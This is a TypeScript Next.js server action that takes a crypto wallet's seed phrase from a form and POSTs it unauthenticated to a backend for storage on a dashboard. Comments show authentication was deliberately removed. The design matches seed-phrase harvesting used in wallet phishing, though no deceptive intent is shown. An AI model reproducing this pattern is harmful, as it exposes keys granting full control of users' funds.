
'use server';

import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
import type { SeedPhraseFormData } from '@/lib/definitions';
// Removed cookies import
import { revalidatePath } from 'next/cache'; // Import revalidatePath

// Base URL for your backend API - Ensure this is set in your environment variables
const BACKEND_API_URL = process.env.NEXT_PUBLIC_BACKEND_API_URL || 'http://localhost:3001';

export async function saveSeedPhraseAction(
  formData: SeedPhraseFormData // Use the full form data type again
): Promise<{ success: boolean; error?: string }> {

  // 1. Authentication Removed
  // No need to get auth token anymore

  // 2. Validate the incoming form data using Zod schema
  const validatedFields = seedPhraseFormSchema.safeParse(formData);

  if (!validatedFields.success) {
    console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
    // Extract the first validation error message
    const firstError = Object.values(validatedFields.error.flatten().fieldErrors).flat()[0];
    return {
      success: false,
      error: firstError || 'Invalid data. Please check your input.',
    };
  }

  // Use the validated data, which includes transformations (like trim/lowercase for seed phrase)
  const dataToSave = validatedFields.data;

  // Log minimal info for debugging (avoid logging sensitive data)
   console.log('[Save Seed Action] Sending save request to backend for wallet:', { walletName: dataToSave.walletName, walletType: dataToSave.walletType });

  // 3. Call the backend API to save the information
  try {
    // API endpoint for saving seed phrases (POST request)
    const response = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // Removed Authorization header
      },
      // Send the validated and potentially transformed data
      body: JSON.stringify(dataToSave),
    });

    // Check if the request was successful (e.g., 201 Created)
    if (response.ok) { // Status codes 200-299 are considered ok
        console.log('[Save Seed Action] Backend save successful.');
         // Revalidate the dashboard path to show the newly added phrase
         revalidatePath('/dashboard');
         console.log('[Save Seed Action] Revalidated /dashboard path.');
        return { success: true };
    } else {
      // Handle API errors (e.g., 400 Bad Request, 500 Internal Server Error)
      let errorMessage = `Failed to save information (status: ${response.status})`;
      try {
          // Attempt to parse error response from backend
          const errorData = await response.json();
          // Use backend message if available, otherwise keep the status-based message
          errorMessage = errorData.message || errorMessage;
          // If backend sends specific validation errors (like Mongoose validation)
          if (errorData.errors && Array.isArray(errorData.errors) && errorData.errors.length > 0) {
              // Join multiple error messages if they exist
              errorMessage = errorData.errors.join(' ');
          } else if (errorData.message) {
              errorMessage = errorData.message;
          }
           console.error('[Save Seed Action] Backend save failed:', { status: response.status, errorData });
      } catch (e) {
          // If parsing the error response fails, use the status text
           console.error('[Save Seed Action] Backend save failed, could not parse error response:', response.status, response.statusText);
          errorMessage = `Failed to save information: ${response.statusText || 'Unknown server error'}`;
      }
      return { success: false, error: errorMessage };
    }
  } catch (error) {
    // Handle network errors or other unexpected issues during fetch
    console.error('[Save Seed Action] Network or unexpected error calling backend:', error);
     const message = error instanceof Error ? error.message : 'An unknown network error occurred.';
    return {
      success: false,
      error: `Failed to connect to the server: ${message}`,
    };
  }
}
